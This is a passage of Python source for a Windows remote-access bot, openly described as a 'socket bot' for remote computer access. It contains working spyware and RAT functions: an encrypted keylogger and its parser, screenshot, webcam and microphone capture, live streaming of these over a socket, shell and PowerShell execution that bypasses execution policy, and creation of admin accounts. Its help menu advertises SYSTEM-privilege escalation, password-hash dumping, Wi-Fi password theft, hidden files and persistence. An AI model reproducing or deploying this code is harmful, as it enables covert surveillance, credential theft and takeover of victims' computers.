            
        if startup_path_user:
            if not startup_user:
                buf.write('STARTUP USER:\n')

            for n in startup_path_user:
                buf.write(f'\tNAME: {n[0]}\n\tCOMMAND: {n[1]}\n\tSTATUS: {"ENABLED" if n[2] else "DISABLED"}\n\n')

        return buf.getvalue()


def startup_query(name, machine, reg=False):
    if machine:
        query = (
            [REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_MACHINE_STATUS], 
            [PATH_STARTUP_MACHINE, PATH_STARTUP_MACHINE_STATUS]
        )
    else:
        query = (
            [REG_KEY_STARTUP_USER, REG_KEY_STARTUP_USER_STATUS], 
            [PATH_STARTUP_USER, PATH_STARTUP_USER_STATUS]
        )
    
    for (key, key_status) in query:
        for (s_name, s_path, s_status) in startup_enum(key, key_status):
            if s_name == name:
                return [
                    os.path.join(key, name) if reg else s_name,
                    s_path,
                    os.path.join(key_status, name) if reg else s_status 
                ]
    
    return None


def app():
    apps = []

    for n in [REG_KEY_APP, REG_KEY_APP_6432]:
        for i in reg_enum(n, dir=True):
            key_app = os.path.join(n, i)

            try:
                name = reg_get_value(key_app, 'DisplayName')[0]
            except:
                continue
            try:
                vendor = reg_get_value(key_app, 'Publisher')[0]
            except:
                vendor = NULL
            try:
                version = reg_get_value(key_app, 'DisplayVersion')[0]
            except:
                version = NULL
            try:
                alang = KEYBOARD_LAYOUT.get(f'{reg_get_value(key_app, "Language")[0]:08X}', NULL)
            except:
                alang = NULL
            try:
                date = datetime.strptime(reg_get_value(key_app, 'InstallDate')[0], '%Y%m%d').strftime('%d.%m.%Y')
            except:
                date = NULL

            apps.append([
                name,
                vendor,
                version,
                alang,
                date
            ])

    return apps


def app_blocker():
    while True:
        sleep(3)

        if not os.path.isfile(FILE_APP_BLOCKER):
            continue
        
        try:
            blocked_app = read_file(FILE_APP_BLOCKER)

            if not blocked_app:
                continue

            for line in decrypt(blocked_app).splitlines():
                n = line.split('=')

                if len(n) == 2:
                    kill(n[0])
        except:
            continue


def delete_app(name):
    for n in [REG_KEY_APP, REG_KEY_APP_6432]:
        for i in reg_enum(n, dir=True):
            try:
                app_name = reg_get_value(os.path.join(n, i), 'DisplayName')[0]
            except:
                continue

            if app_name == name:
                try:
                    rapp = reg_get_value(os.path.join(n, i), 'UninstallString')[0]

                    unapp_str = rapp.split(maxsplit=1)
                    uninstaller, path = unapp_str[0].lower(), unapp_str[-1]

                    if uninstaller.startswith('msiexec'):
                        cmd = f'msiexec {path} /quiet /qn /norestart'
                    elif rapp.endswith('exe'):
                        cmd = f'{quote(rapp)} /VERYSILENT /SUPPRESSMSGBOXES /NORESTART'
                    else:
                        cmd = rapp 

                    shell(cmd)
                except:
                    return False
                else:
                    return True
                
    return False


def get_admin_group():
    try:
        return win32security.LookupAccountSid(None, win32security.CreateWellKnownSid(win32security.WinBuiltinAdministratorsSid, None))[0]
    except:
        return 'Administrators'  


def user(mode, name, password='', old_password='', description='', group=''):
    match mode:
        case 'get':
            data = []

            try:
                users = win32net.NetUserEnum(None, 0, 0)[0]
            except:
                return data
            
            for n in users:
                try:
                    quser = win32net.NetUserGetInfo(None, n['name'], 4)
                except:
                    continue

                data.append([
                    str(quser.get('user_sid', NULL)).removeprefix('PySID:'),
                    quser.get('full_name', NULL),
                    quser.get('name', NULL),
                    quser.get('comment', NULL),
                    quser.get('priv', NULL) == 2,
                    quser.get('bad_pw_count', NULL),
                    'NEVER LOGIN' if quser.get('last_logon', 0) == 0 else ctime(quser['last_logon']),
                    NULL if quser.get('flags') is None else not bool(quser['flags'] & win32netcon.UF_ACCOUNTDISABLE)
                ])
            
            return data
        case 'query':
            try:
                quser = win32net.NetUserGetInfo(None, name, 4)
            except:
                return []
            
            return [
                str(quser.get('user_sid', NULL)).removeprefix('PySID:'),
                quser.get('full_name', NULL),
                quser.get('name', NULL),
                quser.get('comment', NULL),
                quser.get('priv', NULL) == 2,
                quser.get('bad_pw_count', NULL),
                'NEVER LOGIN' if quser.get('last_logon', 0) == 0 else ctime(quser['last_logon']),
                NULL if quser.get('flags') is None else not bool(quser['flags'] & win32netcon.UF_ACCOUNTDISABLE)
            ]
        case 'query_group':
            try:
                return ' | '.join(win32net.NetUserGetLocalGroups(None, name))
            except:
                return NULL
        case 'group':
            try:
                win32net.NetLocalGroupAddMembers(None, group, 3, [{'domainandname': name}])
                return f'user ({name}) logged in group ({group}) [+]'
            except BaseException as error:
                if error.args[0] == 1378:
                    return f'user ({name}) logged in group ({group}) [+]'
                elif error.args[0] == 1387:
                    return f'group does not exist ({group}) [*]'
                
            return f'failed to logged user ({name}) in group ({group}) [-]'
        case 'ungroup':
            try:
                win32net.NetLocalGroupDelMembers(None, group, [name])
                return f'user ({name}) unlogged in group ({group}) [+]'
            except BaseException as error:
                if error.args[0] == 1387:
                    return f'group does not exist ({group}) [*]'
            
            return f'failed to unlogged user ({name}) in group ({group}) [-]'
        case 'admin':
            try:
                win32net.NetLocalGroupAddMembers(None, get_admin_group(), 3, [{'domainandname': name}])
                return f'user is admin ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 1378:
                    return f'user is admin ({name}) [+]'
                elif error.args[0] == 1387:
                    return f'user does not exist ({name}) [*]'
            
            return f'failed to admin user ({name}) [-]'
        case 'unadmin':
            try:
                win32net.NetLocalGroupDelMembers(None, get_admin_group(), [name])
                return f'user is not admin ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 1387:
                    return f'user does not exist ({name}) [*]'
            
            return f'failed to unadmin user ({name}) [-]'
        case 'password':
            try:
                win32net.NetUserChangePassword(None, name, old_password, password)
                return f'user ({name}) password ({old_password if old_password else "none"}) --> ({password if password else "none"}) [+]'
            except:
                return f'failed to change user password ({name}) [-]'
        case 'create':
            try:
                win32net.NetUserAdd(None, 1, {
                    'name': name,
                    'password': password,
                    'priv': win32netcon.USER_PRIV_USER,
                    'comment': description,
                    'flags': win32netcon.UF_SCRIPT | win32netcon.UF_NORMAL_ACCOUNT | win32netcon.UF_DONT_EXPIRE_PASSWD
                })
                return f'user is created ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 2224:
                    try:
                        iuser = win32net.NetUserGetInfo(None, name, 4)
                        iuser['password'] = password
                        iuser['comment'] = description
                        win32net.NetUserSetInfo(None, name, 4, iuser)

                        return f'user is created ({name}) [+]'
                    except: ...

            return f'failed to create user ({name}) [-]'
        case 'delete':
            try:
                win32net.NetUserDel(None, name)
                return f'user is deleted ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 2221:
                    return f'user does not exist ({name}) [*]'
            
            return f'failed to delete user ({name}) [-]'
        case 'enable':
            try:
                quser = win32net.NetUserGetInfo(None, name, 4)
                quser['flags'] = quser.get('flags', 0) & ~win32netcon.UF_ACCOUNTDISABLE
                win32net.NetUserSetInfo(None, name, 4, quser)

                return f'user is enabled ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 2221:
                    return f'user does not exist ({name}) [*]'
            
            return f'failed to enable user ({name}) [-]'
        case 'disable':
            try:
                quser = win32net.NetUserGetInfo(None, name, 4)
                quser['flags'] = quser.get('flags', 0) | win32netcon.UF_ACCOUNTDISABLE
                win32net.NetUserSetInfo(None, name, 4, quser)

                return f'user is disabled ({name}) [+]'
            except BaseException as error:
                if error.args[0] == 2221:
                    return f'user does not exist ({name}) [*]'
            
            return f'failed to disable user ({name}) [-]'


def get_title_by_pid(pid):


    def callback(hwnd, _):
        nonlocal proc_title

        if proc_title is not NULL:
            return True  

        _, wpid = win32process.GetWindowThreadProcessId(hwnd)

        if wpid != pid or not win32gui.IsWindowVisible(hwnd):
            return True

        title = win32gui.GetWindowText(hwnd).strip()

        if not title:
            return True

        style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)

        if style & win32con.WS_EX_TOOLWINDOW:
            return True

        proc_title = title
        return True
    

    proc_title = NULL

    try:
        win32gui.EnumWindows(callback, None)
    except: ...

    return proc_title


def ps():
    process = []

    for n in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info', 'create_time', 'status']):
        proc_pid = n.info.get('pid', NULL)
        proc_cpu =  n.info.get('cpu_percent', NULL)
        proc_mem = n.info.get('memory_info', NULL)
        proc_time = n.info.get('create_time', NULL)

        if (proc_cpu != NULL) and (proc_cpu is not None):
            proc_cpu = f'{int(proc_cpu)}%'

        if (proc_mem != NULL) and (proc_mem.rss is not None):
            proc_mem = f'{proc_mem.rss >> 10} KB'

        if (proc_time != NULL) and (proc_time is not None):
            proc_time = str(timedelta(seconds=int(time() - proc_time)))

        process.append([
            proc_pid,
            n.info.get('name', NULL),
            get_title_by_pid(proc_pid),
            n.info.get('username', NULL),
            proc_cpu,
            proc_mem,
            proc_time,
            n.info.get('status', NULL).upper()
        ])

    return process


def kill(proc):
    killed = False

    if proc.isdigit():
        try:
            psutil.Process(int(proc)).kill()
        except: ...
        else:
            killed = True
    else:
        for n in psutil.process_iter(['name']):
            try:
                if n.info.get('name', NULL) == proc:
                    n.kill()
                    killed = True
            except:
                continue
    
    return killed


def launch(path, args, window=True):
    if not os.path.exists(path):
        path = os.path.join(PATH_SHARE, path)

        if not os.path.exists(path):
            return None
    
    try:
        win32api.ShellExecute(
            None, 
            'open', 
            path, 
            args if args else None, 
            None, 
            int(window)
        )
    except:
        return False
    else:
        return True


def wincmd(command, output=False):
    try:
        executed = sp_run(
            command, 
            input=None, 
            stdout=PIPE if output else DEVNULL,
            stderr=PIPE if output else DEVNULL,
            shell=True
        ) 
    except FileNotFoundError:
        return f'command not found "{command}"'
    except BaseException as error:
        return f'{type(error).__name__}({error})'
    else:
        if not output:
            return executed.returncode == 0

        out = executed.stdout or executed.stderr

        return decode_bytes(memoryview(out)) if out else NULL


def powershell(command, output=False):
    try:
        executed = sp_run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', command], 
            input=None, 
            stdout=PIPE if output else DEVNULL,
            stderr=PIPE if output else DEVNULL,
        ) 
    except FileNotFoundError:
        return 'powershell is not working [*]'
    except BaseException as error:
        return f'{type(error).__name__}({error})'
    else:
        if not output:
            return executed.returncode == 0

        out = executed.stdout or executed.stderr

        return decode_bytes(memoryview(out)) if out else NULL
        

def eventlog():
    events = {}
    
    enum_eventlog = shell('wevtutil enum-logs', output=True)

    for log in ['HardwareEvents', 'System', 'Application', 'Setup', 'ForwardedEvents', 'Security'] if not enum_eventlog else enum_eventlog.splitlines():
        try: 
            handle = win32evtlog.OpenEventLog('localhost', log)
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            
            geventlog = win32evtlog.ReadEventLog(handle, flags, 0)
        except:
            continue

        events[log] = []
 
        for n in geventlog:
            events[log].append([
                NULL if n.EventID is None else n.EventID,
                NULL if n.RecordNumber is None else n.RecordNumber,
                NULL if n.EventCategory is None else EVENTLOG_CATEGORY.get(n.EventCategory, NULL),
                NULL if n.EventType is None else EVENTLOG_TYPE.get(n.EventType, NULL),
                NULL if n.StringInserts is None else ' '.join((n.StringInserts)),
                n.Data if n.Data else NULL
            ])
            
        win32evtlog.CloseEventLog(handle)

    return events

    
def verify_cursor(cur):
    return (cur != 'none') and os.path.isfile(cur) and (os.path.splitext(cur)[-1] in {'.cur', '.ani'})


def screenshot():
    try:
        with mss() as sct:
            monitor = sct.monitors[0]  
            img = sct.grab(monitor)
            return memoryview(to_png(img.rgb, img.size))
    except:
        return None


def webcam_screenshot():
    cap = opencv.VideoCapture(0)

    if not cap.isOpened():
        return None

    try:
        ret, frame = cap.read()

        if not ret:
            return None

        ok, buf = opencv.imencode('.png', frame)

        if not ok:
            return None

        return memoryview(buf)
    except:
        return None
    finally:
        cap.release()


def audio(second):
    input_device = None

    for (n, device) in enumerate(sd.query_devices()):
        if device['max_input_channels'] > 0:
            input_device = n
            break

    if input_device is None:
        return None

    try:
        audio_data = sd.rec(
            int(second * 44_100),
            samplerate=44_100,
            channels=2,
            dtype='int16',
            device=input_device
        )
        sd.wait()

        buf = BytesIO() 

        with open_wave(buf, 'wb') as f:
            f.setnchannels(2)
            f.setsampwidth(2)
            f.setframerate(44100)
            f.writeframes(audio_data.tobytes())
        
        buf.seek(0, os.SEEK_SET)

        return buf.getbuffer()
    except:
        return None


def share(mode, sock, send):
    if mode == '-s':
        sock.send(b'\x01')

        with mss() as sct:
            monitor = sct.monitors[1]  

            while True:
                buf = sct.grab(monitor)

                send(memoryview(to_png(buf.rgb, buf.size)))

                if sock.recv(64) == b'0x2a44738d62feabcf': 
                    return
    elif mode == '-w':
        cap = opencv.VideoCapture(0)

        if not cap.isOpened():
            sock.send(b'\x00')
            return 
        
        sock.send(b'\x01')

        while True:
            ret, frame = cap.read()

            if ret:
                ok, buf = opencv.imencode('.png', frame)

                if not ok:
                    buf = _x00
            else:
                buf = _x00
            
            send(memoryview(buf))

            if sock.recv(64) == b'0x2a44738d62feabcf': 
                cap.release()
                return
    elif mode == '-a':
        sock.send(b'\x01')

        while True:
            buf = audio(1)

            send(_x00 if buf is None else buf)

            if sock.recv(64) == b'0x2a44738d62feabcf':
                return


def display_img(path):
    img = opencv.imread(path)

    if img is None:
        return False
    else:
        title = os.path.split(path)[-1]

        win32api.ShowCursor(False)
        opencv.namedWindow(title, opencv.WINDOW_NORMAL)
        opencv.imshow(title, img)

        while True:
            opencv.waitKey(0)

            if opencv.getWindowProperty(title, opencv.WND_PROP_VISIBLE) < 1: 
                break

        opencv.destroyAllWindows()
        win32api.ShowCursor(True)

    return True


def init_clipboard(func, *args):
    win32clipboard.OpenClipboard()

    try:
        return func(*args)
    except:
        return False
    finally:
        win32clipboard.CloseClipboard()


def keylogger():
    buffer = StringIO()
    buffer_size = 0
    
    while True:
        sleep(3)

        if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
            continue
        
        init_layout = get_layout()

        while True:
            if buffer_size == KEYLOGGER_BUFFER_SIZE:
                with open(FILE_KEYLOGGER, 'a', encoding=FILE_ENCODING) as f:
                    f.write(encrypt(buffer.getvalue()) + '\n') 
                    
                buffer = StringIO()
                buffer_size = 0

                if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
                    break
    
            try:
                kevent = kb.read_event()
                current_layout = get_layout()
            except:
                continue
            
            if kevent.event_type != 'down':
                continue
            
            key = kevent.name
            hotkey = KEYBOARD_HOTKEY.get(key)

            if hotkey is None:
                key = (('U' if key.isupper() else 'L') + str(kevent.scan_code)) if key.isalpha() else key

                buffer.write(f'{init_layout}\u200F{current_layout}\u200F{key}\u2060')
            else:
                buffer.write(hotkey + '\u2060')

            buffer_size += 1


def keylogger_parser(mode):


    def is_char(c):
        return not (c.startswith('[') and c.endswith(']'))
     

    def insert_key(k):
        nonlocal buffer, ptr

        buffer.insert(ptr, k)
        ptr += 1
    

    with BytesIO() as data:
        if not os.path.isfile(FILE_KEYLOGGER):
            return data

        with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f:
            for i in f:
                try:
                    keylogger_data = decrypt(i).split('\u2060')
                except:
                    break

                buffer = []
                ptr = 0

                for line in keylogger_data: 
                    n = line.split('\u200F')

                    if not n or (n[0] == '&'):
                        continue

                    if len(n) == 3:
                        init_layout, current_layout, key = n
                        
                        match current_layout:
                            case 'en':
                                kmap = EN
                            case 'ru':
                                kmap = RU
                            case 'ua':
                                kmap = UA

                        cflag = key[0]

                        if cflag in {'U', 'L'}:
                            char = kmap.get(key[1:], key)
                            insert_key(char.upper() if cflag == 'U' else char)
                        else:
                            if (init_layout == 'en') and (current_layout in {'ru', 'ua'}):
                                insert_key(RU_SPECIAL.get(kmap.get(key), key))
                            else:
                                insert_key(key)
                    else:
                        hotkey = n[0]

                        if mode in {'base', 'char'}:
                            insert_key(KEYBOARD_SPECIAL.get(hotkey, '' if mode == 'char' else hotkey))
                            continue

                        match hotkey:
                            case '[BACKSPACE]':
                                if ptr > 0:
                                    prev = buffer[ptr - 1]

                                    if is_char(prev):
                                        ptr -= 1
                                        buffer.pop(ptr)
                            case '[DELETE]':
                                if ptr < len(buffer):
                                    nextk = buffer[ptr]

                                    if is_char(nextk):
                                        buffer.pop(ptr)
                            case '[LEFT]':
                                if ptr == 0:
                                    continue

                                prev = buffer[ptr - 1]

                                if prev == '[CTRL]':
                                    while (ptr > 0) and (buffer[ptr - 1] == '[CTRL]'):
                                        buffer.pop(ptr - 1)
                                        ptr -= 1

                                    while (ptr > 0) and (buffer[ptr - 1].isspace() or not is_char(buffer[ptr - 1])):
                                        ptr -= 1

                                    while (ptr > 0) and (not buffer[ptr - 1].isspace() and is_char(buffer[ptr - 1])):
                                        ptr -= 1
                                else:
                                    ptr -= 1
                            case '[RIGHT]':
                                    if ptr >= len(buffer):
                                        continue  

                                    cur = buffer[ptr - 1]

                                    if cur == '[CTRL]':
                                        while (ptr < len(buffer)) and (buffer[ptr - 1] == '[CTRL]'):
                                            buffer.pop(ptr - 1)
                                            ptr -= 1
                
                                        while (ptr < len(buffer)) and buffer[ptr].isspace():
                                            ptr += 1

                                        while (ptr < len(buffer)) and is_char(buffer[ptr]) and not buffer[ptr].isspace():
                                            ptr += 1
                                    else:
                                        ptr += 1
                            case '[CTRL]':
                                insert_key('[CTRL]')
                            case _:
                                insert_key(KEYBOARD_SPECIAL.get(hotkey, hotkey if mode == 'hotkey' else ''))

                    ptr = max(0, min(ptr, len(buffer)))

                buffer = ''.join(buffer)

                if mode == 'no hotkey':
                    buffer = buffer.replace('[CTRL]', '')
                
                data.write(buffer.encode())

        data.seek(0, os.SEEK_SET)

        return data.getbuffer()


def execute(cmd, send, recv, client):
    cmd_lower = cmd.lower()

    match cmd_lower:
        case 'author': 
            send('''
Hello, welcome to my project!
This project is designed for remote computer access.
This version is (SOCKET BOT)
My name is Vladislav Khudash.
You can contact me on GitHub: https://github.com/cppandpython
''')
            return
        case 'help':
            send('''Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    clear                     Clear output
    session                   About this session
    gethost                   Current host  
    getpid                    Current pid
    getuid                    Current user
    getsystem                 Get SYSTEM rights
    config                    Bot config control
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in working directory    
    mkfile                    Create file               
    mkdir                     Create dir              
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    upload                    Upload file
    zip                       Make archive current directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    device                    Device utilities                                                                            
    systeminfo                Get information about computer  
    dxdiag                    Get information about computer using dxdiag
    reg                       Registry utilities  
    gpedit                    Local Group Policy utilities  
    service                   Service utilities 
    task                      Task utilities 
    startup                   Startup utilities   
    app                       App utilities    
    env                       Environment utilities
    lang                      Language utilities
    user                      User utilities                 
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Enter cmd  
    powershell                Enter powershell   
    eventlog                  Get events from the eventlog      
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    logout                    User logout
    hibernate                 Hibernate computer
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    hashpass                  Dump contents of SAM and SECURITY and SYSTEM database
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Screen utilities
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    share                     Share utilities
    img                       Display image
    msg                       Display message                     
    keylogger                 Keylogger utilities     
''', doc='help.txt')
            return
        case 'clear':
            return
        case 'getpid':
            send(str(PID))
            return
        case 'getuid':
            send(NODE + '\\\\' + USER)
            return
        case 'getsystem':
            is_system = getsystem()

            if is_system:
                send('got SYSTEM rights [+]')
                os._exit(0)
            else:
                send('failed to get SYSTEM rights [-]')

            return
        case 'config':
            send('''
config -g  —  Get current bot config\n
config (SEED) -s (value)  —  Set config option\n
config -r (SEED)  —  Reset config option
''')
            return
        case 'autostart':
            send('''
autostart -l  —  Get information about bot autostart\n
autostart -c (name) -p (path) -a (none|args) -w (true|false)  —  Create file in bot autostart\n
autostart -d (name)  —  Delete file in bot autostart\n
autostart -r  —  Reset bot autostart
''')
            return
        case 'restart':
            launch(*((BOT_FILE_PATH, None) if IS_EXE else (py_path, __file__)))
            write_file(FILE_BOT_RESTART, '1')
            send('bot is restarted [+]')

            os._exit(0)
            return
        case 'pwd':
            send(os.getcwd())
            return
        case 'cd':
            send('cd (path)  —  Change directory')
            return
        case 'ls':
            ls_list = ls()

            send(f'DIRECTORY: {os.getcwd()}\n\n' + tabulate(ls_list, headers=[('NAME'), ('TYPE'), ('HIDDEN'), ('OWNER'), ('SIZE'), ('TIME')], tablefmt='grid'), doc='ls.txt') if ls_list else send(NULL)
            return
        case 'mkfile':
            send('mkfile (path) -d (data)  —  Create file')
            return
        case 'mkdir':
            send('mkdir (path)  —  Create dir')
            return
        case 'rn':
            send('rn (name) -n (new_name)  —  Rename file or dir')
            return
        case 'rm':
            send('rm (path)  —  Delete file')
            return
        case 'rmdir':
            send('rmdir (path)  —  Delete dir')
            return
        case 'cp':
            send('cp (from_path) -t (to_path)  —  Copy file or dir')
            return
        case 'mv':
            send('mv (from_path) -t (to_path)  —  Move file or dir')
            return
        case 'hide':
            send('hide (path)  —  Hide file or dir')
            return
        case 'unhide':
            send('unhide (path)  —  Unhide file or dir')
            return
        case 'cat':
            send('cat (path)  —  Download file')
            return
        case 'upload': 
            send('upload (path)  —  Upload file in current directory')
            return
        case 'zip':
            current_dir = os.path.split(os.getcwd())[-1]
            zip_path = os.path.join(PATH_TMP, current_dir)

            send(f'{current_dir}.zip')
            client.recv(64)

            try:
                shutil.make_archive(zip_path, 'zip', '.')
            except:
                send(_x00) 
                return

            if os.path.isfile(f'{zip_path}.zip'):
                send(read_file(f'{zip_path}.zip', b=True))
                os.remove(f'{zip_path}.zip')
            else:
                send(_x00)

            return
        case 'inet':
            send('inet -e  —  Enable Internet\n\ninet -d  —  Disable Internet')
            return
        case 'ipconfig':
            with StringIO() as buf:
                ipconfig_dict = ipconfig()

                ipconfig_global, ipconfig_local = ipconfig_dict['global'], ipconfig_dict['local']

                if ipconfig_global is not None:
                    buf.write(f'''GLOBAL:
\tIP: {ipconfig_global["ip"]}
\tISP: {ipconfig_global["isp"]}
\tCOUNTRY: {ipconfig_global["country"]}
\tREGION: {ipconfig_global["region"]}
\tCITY: {ipconfig_global["city"]}
\tPOSTAL: {ipconfig_global["postal"]}
\tTIMEZONE: {ipconfig_global["timezone"]}
\tLOCATION: {ipconfig_global["location"]}
''')
            
                if ipconfig_local is not None:
                    buf.write('\nLOCAL:\n')

                    for n in ipconfig_local:
                        buf.write(f'\tADAPTER: {n["name"]}\n\tMAC: {n["mac"]}\n\tIPV4: {n["ipv4"]}\n\tIPV6: {n["ipv6"]}\n\n')

                data = buf.getvalue()

            send(data, doc='ipconfig.txt') if data else send(NULL)
            return
        case 'route':
            with StringIO() as buf:
                route_dict = route()

                if route_dict['ipv4'] is not None:
                    buf.write(tabulate(route_dict['ipv4'], headers=[('IPV4-ADDRESS'), ('MASK'), ('INTERFACE'), ('GATEWAY'), ('METRIC')], tablefmt='grid'))
                
                if route_dict['ipv6'] is not None:
                    if buf.tell():
                        buf.write('\n\n\n')

                    buf.write(tabulate(route_dict['ipv6'], headers=[('IPV6-ADDRESS'), ('GATEWAY'), ('METRIC')], tablefmt='grid'))
                
                data = buf.getvalue()
                    
            send(data, doc='route.txt') if data else send(NULL)
            return 
        case 'arp':
            arp_list = arp()

            send(tabulate(arp_list, headers=[('IP'), ('MAC'), ('TYPE')], tablefmt='grid'), doc='arp.txt') if arp_list else send(NULL)
            return
        case 'netstat':
            netstat_list = netstat()

            send(tabulate(netstat_list, headers=[('PID'), ('PROTOCOL'), ('LOCAL'), ('FOREIGN'), ('STATUS')], tablefmt='grid'), doc='netstat.txt') if netstat_list else send(NULL)
            return
        case 'wifi':
            send('wifi -g  —  Find Wi-Fi\n\nwifi -p  —  Get Wi-Fi password')
            return
        case 'site':
            send('''
site -p (url)  —  Open website\n
site -d (url) -n (name)  —  Download file from website\n
site -l  —  Get blocked sites\n
site -b (domain)  —  Block site\n
site -d (domain)  —  Unblock site\n
site -r  —  Unblock all sites
''')
            return
        case 'device':
            send('''
device -g  —  Get all devices on the computer\n
device -q (id|guid)  —  Get information about device\n
device -i driver (path)  —  Install device driver\n      
device -s device|driver (id|guid|name)  —  Delete device or device driver\n 
device -e (id|guid)  —  Enable device\n 
device -r (id|guid)  —  Restart device\n 
device -d (id|guid)  —  Disable device\n 
device -v (device_name|device_desc|bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node) (id)?  —  Get value about device or system\n       
device -c (device_name|device_desc) (id) -n (value)  —  Change information about device name or description\n
device -c (bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node) -n (value)  —  Change information about system\n 
device -u  —  Update configuration devices\n 
device -p (path)  —  Print file on printer
''')
            return
        case 'systeminfo':
            send(systeminfo(), doc='systeminfo.txt')
            return
        case 'dxdiag':
            shell(f'dxdiag /t {quote(FILE_DXDIAG)}')

            if os.path.isfile(FILE_DXDIAG):
                try:
                    with open(FILE_DXDIAG, 'r') as f:
                        send(f.read(), doc='dxdiag.txt')
                except:
                    send('failed to get dxdiag [-]')
                finally:
                    os.remove(FILE_DXDIAG)
            else:
                send('dxdiag is not working [*]')

            return
        case 'reg':
            send('''
reg -i  —  Information about register\n
reg -c (key) -n (name)  —  Create register key\n     
reg -c (key) -n (name) -v (value) -t (none|sz|expand_sz|binary|dword|dword_big_endian|qword)  —  Create register value\n
reg -d -k|-v (key) -n (name)  —  Delete register key or value\n
reg -g (key) -n (name)  —  Get register value\n
reg -e -k|-v (key)  —  Get register enum key or value       
''')
            return
        case 'gpedit':
            send('''
gpedit -e machine|user -k|-v (main|key)  —  Get Local Group Policy enum key or policy\n
gpedit -g machine|user (key) -n (name)  —  Get Local Group Policy information about policy\n
gpedit -c machine|user (key) -n (name) -v (allowed|blocked|restricted)  —  Create policy in Local Group Policy\n
gpedit -d machine|user (key) -n (name)  —  Delete policy in Local Group Policy\n
gpedit -u  —  Update Local Group Policy
''')
            return
        case 'service':
            send('''
service -g  —  Get information about services\n
service -q (name)  —  Get information about service\n
service -c (name) -n (display name) -d (description) -p (path) -a (none|args) -m (autostart|manual|disable)  —  Create service\n
service -d (name)  —  Delete service\n
service -m autostart|manual|disable (name)  —  Change service start type\n
service -l (name)  —  Start service\n
service -r (name)  —  Restart service\n
service -s (name)  —  Stop service
''')
            return
        case 'task':
            send('''
task -g  —  Get information about tasks\n
task -q (name)  —  Get information about task\n
task -c system|users|user (name) -d (description) -p (path) -a (none|args) -h (true|false) -e (startup|logon|logoff|idle|time|event) (value)?  —  Create task\n
task -d (name)  —  Delete task\n
task -m enable|disable (name)  —  Change task state\n
task -l (name) -a (none|args)  —  Start task\n
task -s (name)  —  Stop task
''')
            return
        case 'startup':
            send('''
startup -g  —  Get information about startup\n
startup -q machine|user (name)  —  Get information about file in startup\n
startup -c machine|user (name) -p (path) -a (none|args)  —  Create file in startup\n
startup -d machine|user (name)  —  Delete file in startup\n
startup -m machine|user enable|disable (name)  —  Change file mode in startup\n
startup -l machine|user (name)  —  Start file in startup\n
startup -s machine|user (name)  —  Stop file in startup
''')
            return
        case 'app':
            send('''
app -g  —  Get installed applications\n
app -u (name)  —  Delete app\n
app -l  —  Get blocked apps\n
app -b (name)  —  Block app\n
app -d (name)  —  Unblock app\n
app -r  —  Unblock all apps
''')
            return
        case 'env':
            send('''
env -g  —  Get environment\n
env -q (key)  —  Get value of environment key\n
env -c machine|user|tmp (key) -v (value) -t (none|sz|expand_sz|binary|dword|dword_big_endian|qword)  —  Create environment key\n
env -d machine|user|tmp (key)  —  Delete environment key
''')
            return
        case 'lang':
            send('''
lang -g  —  Get installed languages\n
lang -i (name)  —  Install language\n
lang -d (name)  —  Delete language\n
lang -s (name)  —  Set language
''')
            return
        case 'user':
            send('''
user -g  —  Get information about users\n
user -g (group)  —  Get user group information\n
user -q (name)  —  Get information about user\n  
user -j (name) -g (group)  —  User join group\n  
user -uj (name) -g (group)  —  User unjoin group\n
user -a (name)  —  Make user admin\n
user -ua (name)  —  Unmake user admin\n
user -p (name) -o (none|old_password) -n (none|new_password)  —  Change user password\n
user -c (name) -p (password) -d (description)  —  Create user\n
user -r (name)  —  Delete user\n
user -e (name)  —  Enable user\n
user -d (name) —  Disable user
''')
            return
        case 'ps':
            with StringIO() as buf:
                ps_list = ps()

                if not ps_list:
                    send(NULL)
                    return
                
                for n in ps_list:
                    buf.write(f'''PID: {n[0]}
NAME: {n[1]}
TITLE: {n[2]}
USER: {n[3]}
CPU: {n[4]}
MEMORY: {n[5]}
TIME: {n[6]}
STATUS: {n[7]}\n
''')
                    
